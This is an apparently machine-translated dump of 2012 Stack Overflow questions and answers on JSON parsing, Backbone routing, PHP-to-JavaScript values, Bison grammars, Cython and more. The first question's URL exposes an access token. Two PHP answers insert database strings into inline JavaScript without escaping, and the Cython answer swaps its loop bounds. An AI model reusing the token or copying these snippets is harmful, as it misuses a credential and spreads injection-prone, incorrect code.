我正在尝试从 facebook c# sdk 解析 json 数据。The json data I'm trying to parse can be seen here at facebook: [https://graph.facebook.com/search?q=coffee&type=place¢er=37.76,-122.427&distance=1000&access_token=AAAAAAITEghMBACQupPhpGCGi1Jce7eMfZCzt9GlpZBdhz3PlGCyHKNZB1r4FHgd9mgpm8W3g4Adpy9jJjFrsDuxcu3pE4uRT1lbIQjYKgZDZD](https://graph.facebook.com/search?q=coffee&type=place&center=37.76,-122.427&distance=1000&access_token=AAAAAAITEghMBACQupPhpGCGi1Jce7eMfZCzt9GlpZBdhz3PlGCyHKNZB1r4FHgd9mgpm8W3g4Adpy9jJjFrsDuxcu3pE4uRT1lbIQjYKgZDZD)

我下面的代码会弹出一个消息框，显示这个 json 对象的第一个维度，但是，如您所见，每个项目中有一个第二个维度，它提供位置信息，例如经度和纬度。我正在努力寻找一个示例，说明如何使用 WP7 C# 获得此功能（互联网上的大多数示例都使用在 WP7 上不可用的库）。

```
 fbClient.GetCompleted += (o, er) =>
        {
           if (er.Error == null)
           {
              var result = (IDictionary<string, object>)er.GetResultData();
              Dispatcher.BeginInvoke(() =>
              {
                  foreach (var item in (JsonArray)result["data"])
                  {
                     //message box for testing purposes
                     MessageBox.Show((string)((JsonObject)item)["name"]);
                  }
              });
           }
        }); 
```

有人可以提供一个简单的例子吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:53:17.343

因为您与 FacebookSDK 一起使用，所以不需要直接与 json 一起使用。只需将 JsonObjects 转换为 IDictionary 并像 Dictionary 一样使用它：

```
//think better use IEnumerable<object>, because you don't really need JSON array
    foreach (var item in (IEnumerable<object>)result["data"])
                      {
                         var name = (item as IDictionary<string, object>)["name"];
                         //message box for testing purposes
                         MessageBox.Show(name);
                      } 
```

因此，您可以使用`JsonArray`like`IEnumerable<object>`和`JsonObject`like`IDictionary<string, object>`

回答你的问题：

```
var item1 = (IDictionary<string, object>)item;
var location = ((IDictionary<string, object>)(item1)["location"]);
var long = location["longitude"]; 
```

或者您可以使用 JSON 来实现：

```
var location = ((JsonObject)((JsonObject)item)["location"]);
var long = location["longitude"]; 
```

# json - Grails 中的 JSON 转换器

> ID：10772481
> 
> 赞同：2
> 
> 时间：2012-05-27T07:53:12.460
> 
> 标签：json, grails, converters

考虑一个简单的类：-

```
class Person{
     String name
     String email
     int age
     String mobileNum
} 
```

我想选择性地发送“id”和“email”属性作为 JSON 响应。使用时：-

```
return theObject as JSON 
```

响应具有所有属性：值对。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T07:57:27.880

您可以注册自己的 JSON 编组器（例如，在`BootStrap.groovy`），例如：

```
JSON.registerObjectMarshaller(Person) { Person it ->
  return [
    id    : it.id, 
    email : it.email 
  ]
} 
```

# php - php 有类似 pip+virtualenv 的东西吗？

> ID：10772484
> 
> 赞同：1
> 
> 时间：2012-05-27T07:53:27.470
> 
> 标签：php, virtualenv, package-managers

> **可能重复：**
> [php 是否具有与 python 的 virtualenv 或 ruby​​ 的沙箱等效的功能？](https://stackoverflow.com/questions/7182176/does-php-have-an-equivalent-to-pythons-virtualenv-or-rubys-sandbox)

是否存在一些工具，如用于 php 的 virtualenv 和 pip？

# javascript - 如何将多个路由定向到 Backbone JS 中的同一方法？

> ID：10772490
> 
> 赞同：2
> 
> 时间：2012-05-27T07:54:35.473
> 
> 标签：javascript, backbone.js, routes, dry

这是我在 BackboneJS 应用程序中的路由对象：

```
 routes: {
            ""               : "_navigate",
            "home"           : "_navigate",
            "blog"           : "_navigate",
            "photos"         : "_navigate",
            "notes"          : "_navigate",
            "about"          : "_navigate",
            "singlepost_:id" : "_navigate"
        }, 
```

它将路由重定向到该`_navigate`方法，如下所示：

```
 _navigate: function(postId) {
            if (postId) {
               // show single entry
               return;
            }

            // show regular entry
        }, 
```

它工作得很好。但是，我发现重复的路线对象很烦人。

我的问题是：有没有更好的方法可以将所有这些路线引导到相同的方法而不会重复太多？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T12:25:51.567

[http://backbonetutorials.com/what-is-a-router/](http://backbonetutorials.com/what-is-a-router/)查看关于 splats 的部分

> 路由定义中的任何“*splats”或“:params”都作为参数（按相应顺序）传递给相关函数。定义为“/:route/:action”的路由将传递 2 个变量（“route”和“action”）给回调函数。（如果这令人困惑，请发表评论，我会尝试更好地表达它）这里有一些使用“：params”和“*splats”的例子

```
routes: {

        "/posts/:id": "getPost",
        // <a href="http://example.com/#/posts/121">Example</a>

        "/download/*path": "downloadFile",
        // <a href="http://example.com/#/download/user/images/hey.gif">Download</a>

        "/:route/:action": "loadView",
        // <a href="http://example.com/#/dashboard/graph">Load Route/Action View</a>

    },

    getPost: function( id ){ 
        alert(id); // 121 
    },
    downloadFile: function( path ){ 
        alert(path); // user/images/hey.gif 
    },
    loadView: function( route, action ){ 
        alert(route + "_" + action); // dashboard_graph 
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:17:28.553

很简单，真的。

```
 routes: {
            "*actions:_id": "_navigate"
        } 
```

* * *

感谢 BackboneJS Google Group 的 Jason Strimpel。

# php - javascript getting junk value for string passed from PHP

> ID：10772491
> 
> 赞同：0
> 
> 时间：2012-05-27T07:54:36.503
> 
> 标签：php, javascript

I am passing vlues to javasript function from PHP in following manner:

```
<select onChange="display_databody(<?=$manufacturers_id?>,<?=$modelID?>,this.value,<?=**$month_year**?>);"> 
```

Here $month_year is a string obtained from MySQL.

When javascript function is getting this value it is getting something like -8 or -13.

I have tried json_encode() but it is also not working.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:08:04.440

You could use `addslashes` to escape the variables:

```
<select onChange="display_databody('<?= addslashes($manufacturers_id) ?>',
    '<?= addslashes($modelID); ?>', this.value, '<?= addslashes($month_year); ?>');"> 
```

Or use jQuery and `htmlspecialchars`:

```
<select onChange="display_databody(this)" 
    data-manufacturer="<?= htmlspecialchars($manufacturers_id); ?>" 
    data-monthyear="<?= htmlspecialchars($month_year); ?>"> 
```

Then inside your function:

```
function display_databody(dropdown) {
    var $dropdown = $(dropdown),
    dropdown_value = $dropdown.val(),
    manufacturer_id = $dropdown.data('manufacturer'),
    month_year = $dropdown.data('monthyear');

    // your code
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:18:18.597

I had a brainwave and guessed that `$month_year` is a string like `1-12` for January 2012\. This would result in your HTML becoming *something like*

```
 <select onChange="display_databody(2,4,this.value,1-12);"> 
```

and Javascript will evaluate that value (as `-11` here) when it executes the function.

Wrap your string values in single quotes. You may need to do that with the first two as well if they aren't entirely numeric. Line split here for clarity: you will probably join it back together.

```
 <select 
     onChange="display_databody(<?=$manufacturers_id?>,
     <?=$modelID?>,
     this.value,
     '<?=$month_year?>');"> 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-27T07:57:33.503

You have to use echo to write the variable

```
<select onChange="display_databody(<?php echo $manufacturers_id ?>,<?php echo $modelID ?>,this.value,<?php echo $month_year ?>);"> 
```

# jquery - 如何为 SVG 制作边界墙，使动画图像不会脱离 SVG？

> ID：10772494
> 
> 赞同：0
> 
> 时间：2012-05-27T07:56:15.247
> 
> 标签：jquery, html, svg

我在这里想要做的是，我添加了一个小图像，它会在身体周围移动..但问题是，我希望小图像在 svg 框中移动 ..我试图采取SVG ID 并让它附加图像。它仍然会移出 svg 框。我想知道，如果我错过了一些编码？

```
$(window).load(function(){
$(document).ready(function(e) {
var num = 0;
var interval;

/*var svg = d3.select("main").append("svg:svg")
.attr("width", w)
.attr("height", h);
*/

$('#add').click(function(e) {
$('#box').append('<div class="predator" id="predator'+ num + '"><img src="Pictures/PondSpecies/anchovies.png"></div>');
$('#predator'+num).css({
left: randomRange(500,150),
top: randomRange(400,150)
});

if (interval)
clearInterval(interval);
interval = setInterval (function () {

for (var i=0; i<num; i++) {
$('#predator'+i).animate ({
left: '+=' + randomRange(-11,11),
top: '+=' + randomRange(-11,11)

s /* Extra */
//if (x < 0 || x > w) SVG.vx *= -1;
//if (y < 0 || y > h) SVG.vy *= -1;

}, 100);
}
}, 100);
num++;
});

$('#remove').click(function(e) {
num--;

$('#predator' + num).remove();

if (num == 0 && interval)
clearInterval(interval);
});
});

/* FUNCTIONS */
function randomRange(min, max) {
return Math.random() * (max-min) + min;
}
}); 
```

HTML正文：

```
 <div id="box">
    <SVG xmlns="http://www.w3.org/2000/svg"
        xmlns:xlink="http://www.w3.org/1999/xlink" id="main" style="border:solid 1px #000000;width:515;height:474;">
        <image xlink:href="Pictures/PondEnvironment/pond.png" x="0" y="0" width="513" height="474" />
</SVG>
      </div> 
```

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T11:10:01.163

如果您想在制作动画时将捕食者保持在 SVG 内，则每次都需要检查它们的新位置。这个小提琴应该有帮助：

[http://jsfiddle.net/DJg36/18/](http://jsfiddle.net/DJg36/18/)

另外，我认为您的动画没有完全完成，这意味着它们开始排队，可能会引起一些混乱，所以为了确定，您应该在再次制作动画之前调用 stop() 。

所以需要这样的东西：

```
$('#add').click(function(e) {

        $('#box').append('<div class="predator" id="predator' + num + '"><img src="Pictures/PondSpecies/anchovies.png"></div>');
        $('#predator' + num).css({
            left: randomRange(500, 150),
            top: randomRange(400, 150)
        });

        var containerWidth = $("svg").width() - 25; // Minus the width of the img
        var containerHeight = $("svg").height() - 25; // Minus the width of the img

        if (interval) clearInterval(interval);
        interval = setInterval(function() {

            for (var i = 0; i < num; i++) {
                var randomLeft = randomRange(-11, 11);
                var randomTop = randomRange(-11, 11);

                var predator = $('#predator' + i);
                var predatorLeft = parseInt(predator.css("left"));
                var predatorTop = parseInt(predator.css("top"));

                if (predatorLeft + randomLeft <= 0) randomLeft = 11;
                if (predatorLeft + randomLeft >= containerWidth) randomLeft = -11;

                if (predatorTop + randomTop <= 0) randomTop = 11;
                if (predatorTop + randomTop >= containerHeight) randomTop = -11;

                predator.stop();
                predator.animate({
                    left: '+=' + randomLeft,
                    top: '+=' + randomTop
                }, 100);
            }
        }, 100);
        num++;
    }); 
```

希望这可以帮助！

安迪

# python - 检查 url 是文件还是目录

> ID：10772503
> 
> 赞同：0
> 
> 时间：2012-05-27T07:57:34.803
> 
> 标签：python, url

**你好呀。**

我有一个 URL 列表。我不知道如何检查这个地址是文件还是目录。

例子：

```
url = "http://example.com/path/to/file.html"

if '.' in url.split('/')[-1]:
    return True 
```

但如果 url 是

```
url = "http://example.com/path/domains/domain.com" 
```

domain.com 是目录而不是文件。如何检测它？

检查文件扩展名不好，也许是一些标题？但我想尽可能少地使用互联网传输。

编辑：

我需要下载大量链接并将它们的路径映射到我的操作系统中的位置。例如 example.com/path/to/file.html

~/Downloads/example.com/path/to/

在这里下载file.html。例如：

```
example.com/directory/  
create ~/Downlods/example.com/directory/ 
next url: example.com/directory/dir2  
create ~/Downloads/example.com/directory/dir2  
next url: example.com/directory/file.html  
Download file.html in too ~/Downloads/example.com/directory/
not too create file.html directory 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T08:04:03.223

简而言之，你不能。默认情况下，访问 URL [http://example.com/path/domains/domain.com会向](http://example.com/path/domains/domain.com)[http://example.com/path/domains/domain.com/](http://example.com/path/domains/domain.com/)发送 302 重定向（如果我没记错的话） 。响应中没有标头指示 URL 是否指向目录。我可以问你为什么需要知道这个吗？我想您可以在 URL 中添加一个斜杠，然后看看会发生什么。这可能会让你得到你正在寻找的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:51:18.923

在 HTTP 服务器上，没有这样的“文件”或“目录”的东西。您只需向服务器发送一个 URI，该 URI 标识取决于服务器配置的特定资源。默认情况下，大多数 HTTP 服务器使用系统的文件和目录，但可以对其进行配置（URL 重写，...）。

# grammar - 在 Bison 中使用优先级作为一元减号并不能解决移位/减少冲突

> ID：10772504
> 
> 赞同：4
> 
> 时间：2012-05-27T07:57:48.030
> 
> 标签：grammar, bison, unary-operator, shift-reduce-conflict

我正在设计一个非常简单的语法，我使用一元减操作数。但是，我遇到了转变/减少冲突。在 Bison 手册以及我查看的其他任何地方，它都说我应该定义一个新标记并赋予它比二进制减操作数更高的优先级，然后在规则中使用“%prec TOKEN”。

我已经这样做了，但我仍然收到警告。为什么？

我正在使用野牛（GNU Bison）2.4.1。语法如下所示：

```
%{
#include <string>
extern "C" int yylex(void);
%}

%union {
    std::string token;
}

%token <token> T_IDENTIFIER T_NUMBER
%token T_EQUAL T_LPAREN T_RPAREN

%right T_EQUAL
%left T_PLUS T_MINUS
%left T_MUL T_DIV
%left UNARY

%start program

%%

program : statements expr
;

statements : '\n'
           | statements line
;

line : assignment
     | expr
;

assignment : T_IDENTIFIER T_EQUAL expr
;

expr : T_NUMBER
     | T_IDENTIFIER
     | expr T_PLUS expr
     | expr T_MINUS expr
     | expr T_MUL expr
     | expr T_DIV expr
     | T_MINUS expr   %prec UNARY
     | T_LPAREN expr T_RPAREN
; 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-20T13:53:25.540

`%prec`没有你希望的那么多。它告诉 Bison，在`- a * b`您想要将其解析为`(- a) * b`而不是`- (a * b)`. 换句话说，在这里它将更喜欢`UNARY`规则而不是`T_MUL`规则。无论哪种情况，您都可以确定该`UNARY`规则最终会得到应用，这只是输入减少为一元参数的顺序问题。

在您的语法中，情况大不相同。任何`line`非终结符序列都将组成 a `sequence`，并且没有什么可以说`line`非终结符必须在行尾结束。事实上，任何表达式都可以是`line`. 所以这里基本上有两种解析方法`a - b`：或者作为带有二进制减号的单行，或者作为两个“行”，第二种以一元减号开头。没有什么可以决定哪些规则将适用，因此基于规则的优先级在这里还不起作用。

`line`您的解决方案是通过要求每个实际以行尾符号结束或后跟一个行尾符号来纠正您的行拆分。

If you really want the behaviour your grammar indicates with respect to line endings, you'd need two separate non-terminals for expressions which can and which cannot start with a `T_MINUS`. You'd have to propagate this up the tree: the first `line` may start with a unary minus, but subsequent ones must not. Inside a parenthesis, starting with a minus would be all right again.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-01T13:43:28.660

expr 规则没问题（没有 %prec UNARY）。您的班次/减少冲突来自规则：

```
statements : '\n'
           | statements line
; 
```

规则不是你想的那样。例如你可以写：

```
a + b c + d 
```

我认为这不应该是有效的输入。

但程序规则也不是很健全：

```
program : statements expr
; 
```

规则应该是这样的：

```
program: lines;

lines: line | lines line;

line: statement "\n" | "\n";

statement: assignment | expr; 
```

# ruby-on-rails - 部署到 Heroku：CodeRay 未预编译 - 如何删除？

> ID：10772508
> 
> 赞同：0
> 
> 时间：2012-05-27T07:58:09.800
> 
> 标签：ruby-on-rails, ruby, heroku, coderay

我正在学习 Rails 并阅读了有关使用 CodeRay 在您的页面中突出显示可爱的语法的信息。当我使用`rails server`它时它很好，一切都很好，但是当我尝试部署到 Heroku 时，我得到了有用的“出现问题”页面。根据日志，`ActionView::Template::Error (coderay.css isn't precompiled):`. 所以我现在想从我的 Rails 应用程序中删除 CodeRay。

我删除了 CSS 文件、erb 文件中的链接、我的 Gemfile 中的 CodeRay，运行`bundle install`良好`bundle update`，但我仍然得到同样的错误。

```
2012-05-27T07:41:22+00:00 app[web.1]: Completed 500 Internal Server Error in 98ms
2012-05-27T07:41:22+00:00 app[web.1]: 
2012-05-27T07:41:22+00:00 app[web.1]:     2: <html>
2012-05-27T07:41:22+00:00 app[web.1]:     3: <head>
2012-05-27T07:41:22+00:00 app[web.1]: ActionView::Template::Error (coderay.css isn't precompiled):
2012-05-27T07:41:22+00:00 app[web.1]:     5:   <%= stylesheet_link_tag    "application", "coderay", :media => "all" %>
2012-05-27T07:41:22+00:00 app[web.1]:     4:   <title>RG Simms</title>
2012-05-27T07:41:22+00:00 app[web.1]:     6:   <%= javascript_include_tag "application" %>
2012-05-27T07:41:22+00:00 app[web.1]:     7:   <%= csrf_meta_tags %>
2012-05-27T07:41:22+00:00 app[web.1]:     8:   <link rel="/favicon.ico" alt="gentlemanraptor"> 
```

现在，这真的很奇怪。我已经删除了`stylesheet_link_tag`html.erb 中的 coderay，完全卸载了实际的 gem，然后再次部署到 Heroku，但出现了同样的错误。

当前使用 cedar 堆栈和 rails 3.2.3。

难道我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-24T19:36:29.690

您需要告诉 rails 预编译 coderay.css 以及您的其他资产：

```
# application.rb
config.precompile += %w(coderay.css) 
```

试试看。

如果它仍然不起作用，您可能需要将样式表链接标签删除到 coderay，因为它会在资产预编译期间与您的 application.rb 捆绑在一起

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:15:33.627

您需要先在本地编译资产。

看看这里：[https ://devcenter.heroku.com/articles/rails3x-asset-pipeline-cedar](https://devcenter.heroku.com/articles/rails3x-asset-pipeline-cedar)

在推送到 Heroku 之前尝试以下操作。

```
RAILS_ENV=production bundle exec rake assets:precompile 
```

# typo3 - 如何安装 Typo3 扩展：jfmulticontent

> ID：10772512
> 
> 赞同：2
> 
> 时间：2012-05-27T07:59:06.737
> 
> 标签：typo3

作为 Typo3 的新手，我刚刚安装了 jfmulticontent，但显然，它不仅仅是导入和安装。另一方面，它附带的文档对于已经知道自己在做什么的人来说似乎很好。有谁知道，我在哪里可以找到一些对初学者友好的安装说明和关于该插件的一般文档？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T10:21:50.400

确保导入扩展的静态文件。

> 安装扩展后，您必须将静态“多内容（jfmulticontent）”添加到您的模板中

![在此处输入图像描述](../Images/b517405794ce730af088d7cb40d4f64e.png)

我不知道你的网站结构。尝试单击模板，然后单击您的站点根目录。从工具栏中选择**Info/Modify**，然后单击**Edit the entire template record, Includes**。

扩展手册：[http ://typo3.org/extension-manuals/jfmulticontent/2.7.3/view/toc/0/](http://typo3.org/extension-manuals/jfmulticontent/2.7.3/view/toc/0/)

**尝试更具体地了解您的问题。通过这种方式，我们可以更好地帮助您。**

# python - Cython 的功率谱

> ID：10772513
> 
> 赞同：7
> 
> 时间：2012-05-27T07:59:13.587
> 
> 标签：python, optimization, cython, spectrum

我正在尝试使用 Cython 优化我的代码。它正在做一个功率谱，而不是使用 FFT，因为这是我们在课堂上被告知要做的。我尝试在 Cython 中编写代码，但没有发现任何区别。这是我的代码

```
#! /usr/bin/env python
# -*- coding: utf8 -*-

from __future__ import division
cimport numpy as np
import numpy as np
cimport cython

@cython.boundscheck(False)
def power_spectrum(time, data, double f_min, double f_max, double df,w=1 ):

    cdef double com,f
    cdef double s,c,sc,cc,ss
    cdef np.ndarray[double, ndim=1] power
    cdef np.ndarray[double, ndim=1] freq

    alfa, beta = [],[] 
    m = np.mean(data)
    data -= m       

    freq = np.arange( f_min,f_max,df )
    for f in freq:
            sft = np.sin(2*np.pi*f*time)
            cft = np.cos(2*np.pi*f*time)
            s   = np.sum( w*data*sft )
            c   = np.sum( w*data*cft )
            ss  = np.sum( w*sft**2  )
            cc  = np.sum( w*cft**2  )
            sc  = np.sum( w*sft*cft )

            alfa.append( ( s*cc-c*sc )/( ss*cc-sc**2 ))
            beta.append( ( c*ss-s*sc )/( ss*cc-sc**2 ))
            com = -(f-f_min)/(f_min-f_max)*100
            print "%0.3f%% complete" %com

    power = np.array(alfa)**2 + np.array(beta)**2
    return freq,power,alfa,beta 
```

时间和数据通过 numpy.loadtxt 加载并发送到此函数。当我做

```
cython -a power_spectrum.pyx 
```

.html 文件很黄，所以效率不高。尤其是整个 for 循环以及计算功率和返回所有内容。

我曾尝试阅读 Cython 的官方指南，但由于我从未用 C 编写过代码，因此有点难以理解。

非常感谢所有帮助:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T10:49:44.490

Cython 可以[根据此](http://docs.cython.org/src/tutorial/numpy.html)读取 numpy 数组，但它不会神奇地编译诸如`np.sum`- 你仍然只是调用 numpy 方法。

你需要做的是用纯 cython 重写你的内部循环，然后它可以为你编译它。因此，您将需要重新实现`np.sum`等`np.sin`。预分配`aplfa`和`beta`是一个好主意，因此您不要使用`append`并尝试`cdef`尽可能多的变量。

**编辑**

这是一个完整的示例，显示了完全 C 编译的内部循环（没有黄色）。我不知道代码是否正确，但它应该是一个很好的起点！特别注意使用`cdef`无处不在，打开标准库的cdivision`sin`和导入。`cos`

```
from __future__ import division
cimport numpy as np
import numpy as np
cimport cython
from math import pi

cdef extern from "math.h":
    double cos(double theta)
    double sin(double theta)

@cython.boundscheck(False)
@cython.cdivision(True)
def power_spectrum(np.ndarray[double, ndim=1] time, np.ndarray[double, ndim=1] data, double f_min, double f_max, double df, double w=1 ):

    cdef double com,f
    cdef double s,c,sc,cc,ss,t,d
    cdef double twopi = 6.283185307179586
    cdef np.ndarray[double, ndim=1] power
    cdef np.ndarray[double, ndim=1] freq = np.arange( f_min,f_max,df )
    cdef int n = len(freq)
    cdef np.ndarray[double, ndim=1] alfa = np.zeros(n)
    cdef np.ndarray[double, ndim=1] beta = np.zeros(n)
    cdef int ndata = len(data)
    cdef int i, j

    m = np.mean(data)
    data -= m       

    for i in range(ndata):
        f = freq[i]

        s = 0.0
        c = 0.0
        ss = 0.0
        cc = 0.0
        sc = 0.0
        for j in range(n):
            t = time[j]
            d = data[j]
            sf = sin(twopi*f*t)
            cf = cos(twopi*f*t)
            s += w*d*sf
            c += w*d*cf
            ss += w*sf**2
            cc += w*cf**2
            sc += w*sf*cf

        alfa[i] = ( s*cc-c*sc )/( ss*cc-sc**2 )
        beta[i] = ( c*ss-s*sc )/( ss*cc-sc**2 )

    power = np.array(alfa)**2 + np.array(beta)**2
    return freq,power,alfa,beta 
```

# asp.net - 以编程方式填充 ASP.net 数据表

> ID：10772518
> 
> 赞同：0
> 
> 时间：2012-05-27T08:00:03.007
> 
> 标签：asp.net, sharepoint, gridview

我试图在与 Sharepoint 站点不同的服务器上运行的 ASP 页面上显示 Sharepoint 列表。我最初尝试使用服务器对象模型，但没有成功（请参阅：[在未安装 SharePoint 的服务器上使用 Sharepoint GridViews](https://stackoverflow.com/questions/10747907/using-sharepoint-gridviews-on-server-without-sharepoint-installed)）

所以我决定改用客户端对象模型。现在这允许我从 Sharepoint 中提取数据，但是，如果我错了，请纠正我，没有内置功能允许您将 ASP.net 数据表/网格视图绑定到 Sharepoint 对象。ASP.net 页面在未安装 Sharepoint 的服务器上运行。

我非常想使用 ASP.net 网格视图对象，因为它们对设计非常友好（在 GUI 中可见）并且提供了一大堆功能——排序、分页等等。这些对象需要使用 ASP 数据集 afaik（我是 ASP.net 开发的新手），所以我创建了一个数据集对象和一个数据表来获取数据。

这些数据表显然设计用于从基于 SQL 的源中检索数据，因为 Visual Studio 提供的用于填充它们的唯一选项来自各种 SQL 平台。但是，我能够使用 GUI 将我想要的列添加到数据表中。这些列名对应于我要从中检索的 Sharepoint 列表中的元数据列。

现在任何人都可以向我提供步骤 - 最好是关于最佳实践，我需要完成这些步骤以确保在用户加载页面时网格视图填充有值。我已经知道如何通过 Sharepoint Web 服务访问这些值，但我只是不确定如何将它们放入 ASP 数据集中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T07:12:16.483

通过使用[GetListItems](http://msdn.microsoft.com/en-us/library/lists.lists.getlistitems%28v=office.12%29)方法，我可以以 XML 节点的形式拥有特定列表的所有项目。我只需要将此 XML 转换为数据集。以下是如何将 XML 节点转换为 DataSet。您可以遍历 xml 节点并为您的数据集创建行，如此处[所示](https://stackoverflow.com/questions/894451/import-xml-into-dataset-c-sharp)。

# python - 使用 pybarcode ImageWriter 和 docx 模块将条形码图像附加到 docx 文件

> ID：10772522
> 
> 赞同：2
> 
> 时间：2012-05-27T08:01:07.183
> 
> 标签：python

如何减小 pybarcode ImageWriter 生成的图像大小，以及如何将多个图像附加到 docx 文件并正确对齐？

我阅读了有关ImageWriter 的**dpi**选项，但没有了解如何使用它。

```
import barcode
from barcode.writer import ImageWriter
from docx import *

if __name__ == '__main__':        
    # Default set of relationshipships - these are the minimum components of a document
    ean = barcode.get_barcode('ean', '123456789102', writer=ImageWriter())
    ean.default_writer_options['module_height'] = 3.0
    ean.default_writer_options['module_width'] = 0.1
    filename = ean.save('bar_image')    

    relationships = relationshiplist()

    # Make a new document tree - this is the main part of a Word document
    document = newdocument()

    # This xpath location is where most interesting content lives 
    docbody = document.xpath('/w:document/w:body', namespaces=nsprefixes)[0]
    # Add an image
    relationships,picpara = picture(relationships, filename,'This is a test description')
    docbody.append(picpara)

    # Create our properties, contenttypes, and other support files
    coreprops = coreproperties(title='Python docx demo',subject='A practical example of making docx from Python',creator='Mike MacCana',keywords=['python','Office Open XML','Word'])
    appprops = appproperties()
    contenttypes = contenttypes()
    websettings = websettings()
    wordrelationships = wordrelationships(relationships)

    # Save our document
        savedocx(document,coreprops,appprops,contenttypes,websettings,wordrelationships,'sample_barcode.docx') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T13:01:04.757

通常，barcode.writer**不会**给出生成的输出图像大小的参数，您可以向[PIL](http://www.pythonware.com/products/pil/)寻求帮助。并且**正确的对齐方式**对于代码来说并不准确，但是您可以尝试使用表格将它们放置在正确的位置。

在 PIL 中，您可以通过以下方式将 png 图像的大小调整为 (480,320)

```
from PIL import Image
im = Image.open("barcode.png")
im.resize((480,320)).save("barcode_resized.png") 
```

对于 docx 文件，[这里](https://github.com/mikemaccana/python-docx/blob/master/example-makedocument.py)有一些表格示例，您可能需要知道什么是正确的食物，然后输入代码。

# javascript - 如何从包含 div 的 textarea 中获取价值

> ID：10772524
> 
> 赞同：1
> 
> 时间：2012-05-27T08:01:19.290
> 
> 标签：javascript, jquery, html

我有一个包含一些 HTML 的文本区域（不要问我为什么！:)）

HTML 看起来像：

```
<div class="text-tag">some gibberish 1</div> 
<div class="text-tag">some gibberish 2</div> 
<div class="text-tag">some gibberish 3</div> 
```

我如何从中获取值：一些乱码1，一些乱码2和一些乱码3？

**编辑：**

我的 HTML 如下所示：

```
<textarea>
    <div class="text-tag">some gibberish 1</div> <div class="text-tag">some gibberish 2</div>  <div class="text-tag">some gibberish 3</div>
</textarea> 
```

这个 html 是由用户输入的，我需要解析用户在 textarea 中输入的 HTML。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T08:02:59.680

```
var alltext = [];

$('div.text-tag').each(function() {
  alltext.push($(this).text());
});

console.log(alltext.join(', ')); // output: some gibberish 1, some gibberish 2, some gibberish 3 
```

或者

```
​var alltext = $('div.text-tag').text();
console.log(alltext); // output: some gibberish 1some gibberish 2some gibberish 3 
```

或者

```
var alltext = [];
$('div.text-tag').text(function(index, text) {
   alltext.push(text);
});
console.log(alltext.join(', '))​​; // output: some gibberish 1, some gibberish 2, some gibberish 3 
```

### 根据您的编辑：

```
var content = $($.trim($('textarea').val())),
    alltext = [];
$(content).each(function() {
  if(this.nodeType != 3)
      alltext.push($(this).text());
});
console.log(alltext.join(', ')); 
```

[**示例锻炼 1**](http://jsfiddle.net/uQ5Ud/)

​ 另一个样本：

```
var textarea = $("textarea").val(),
    alltext = [];
$(textarea).filter(function(index, item) {
   if($(item).hasClass('text-tag'))
       alltext.push($(item).text());
})
console.log(alltext.join(', ')); 
```

**[示例锻炼 2](http://jsfiddle.net/XWp4b/1/)**

​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:06:26.213

我不知道什么更好，但我会为您的任务使用以下代码：

```
var values = [];
$(​$(​"textarea").val()​​​​​​).filter(".text-tag").each(function() {
    values.push(this.innerHTML);
});​​​​​​​
console.log(values); 
```

**演示：http:** [//jsfiddle.net/XWp4b/](http://jsfiddle.net/XWp4b/)

# jquery - 如何在jqgrid中选择行

> ID：10772527
> 
> 赞同：0
> 
> 时间：2012-05-27T08:01:48.517
> 
> 标签：jquery, jqgrid, jqgrid-asp.net, jqgrid-formatter

我在表单中有 jqgrid，我希望当用户单击该行时选择该行，但是通过此代码仅选择第一行，当用户单击第 n 行时选择一个。我写这段代码

```
var gridItem = $('#listItem');
gridItem.jqGrid({
    url: 'jQGridHandler.ashx',
    postData: { ActionPage: 'ClearanceItems', Action: 'Fill', requestId: rowid },
    ajaxGridOptions: { cache: false },
    datatype: 'json',
    height: 200,
    colNames: ['REQUEST_ID','ITEM_NO','GOODS_DESCRIPTION','QUANTITY'],
    colModel: [
        { name: 'REQUEST_ID', width: 100, sortable: true },
        { name: 'ITEM_NO', width: 200, sortable: true },
        { name: 'GOODS_DESCRIPTION', width: 100, sortable: true },
        { name: 'QUANTITY', width: 100, sortable: true }
    ],
    gridview: true,
    rowNum: 20,
    rowList: [20, 40, 60],
    pager: '#pagerItem',
    viewrecords: true,
    sortorder: 'ASC',
    rownumbers: true,
});
gridItem.jqGrid('navGrid', '#pagerItem', { add: false, edit: false, del: true }, {}, {},
    {}, { multipleSearch: true, overlay: false, width: 460 }); 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-28T08:37:25.027

如果在选择一行时将选择另一行（通常是网格中的第一行），那么我可以假设您在填充数据时遇到问题。如果`id`所有行的值都相同，那么所有行`<tr>`（代表行）都具有相同的 id。HTML 不允许 id 重复。

所以你应该改变生成的数据`url: 'jQGridHandler.ashx'`。如果`'REQUEST_ID'`列中的值是唯一的，您可以将其包含`key: true`为`'REQUEST_ID'`列的附加属性。在这种情况下，列中的值将用作 rowid。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:19:21.960

我不确定您是否指的是“多选”，如果是，您可以将网格的选项“多选”设置为 true。像这样：

```
$("#listitem").setGridParam({"multiselect":true}); 
```

或设置初始化选项：

```
multiselect : true 
```

# c - 函数指针：访问结构内的数据？

